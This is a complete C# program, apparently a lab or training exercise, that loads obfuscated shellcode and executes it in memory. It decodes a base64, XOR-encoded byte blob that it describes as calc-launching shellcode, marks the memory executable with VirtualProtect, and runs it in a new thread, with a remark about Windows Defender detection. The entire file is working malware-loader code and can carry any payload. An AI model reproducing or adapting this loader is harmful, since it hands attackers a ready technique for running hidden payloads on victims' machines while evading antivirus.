using System;
using System.Runtime.InteropServices;

namespace A03_4_ObfuscatedLoader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint INFINITE = 0xFFFFFFFF;

        static void Main(string[] args)
        {
            // 1. The Obfuscated Data (XOR 0x5A)
            // This string represents the exact 138 bytes of the calc shellcode.
            string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";

            byte[] encoded = Convert.FromBase64String(embeddedBlob);
            byte[] decoded = new byte[encoded.Length];

            // Inline XOR for simplicity
            for (int i = 0; i < encoded.Length; i++)
            {
                decoded[i] = (byte)(encoded[i] ^ 0x5A);
            }

            Console.WriteLine("[*] Target Architecture: x64");
            Console.WriteLine("[*] Payload Size: {0} bytes", decoded.Length);

            // 2. Allocate
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)decoded.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (mem == IntPtr.Zero) return;

            // 3. Copy
            Marshal.Copy(decoded, 0, mem, decoded.Length);

            // 4. Flip Permissions
            uint oldProtect;
            VirtualProtect(mem, (UIntPtr)decoded.Length, PAGE_EXECUTE_READ, out oldProtect);

            // 5. Launch
            Console.WriteLine("[*] Launching thread at 0x{0:X}...", mem.ToInt64());
            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out uint threadId);

            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine("[*] Successfully started. If no calc appears, check Windows Defender history.");
                WaitForSingleObject(hThread, INFINITE);
            }
        }
    }
}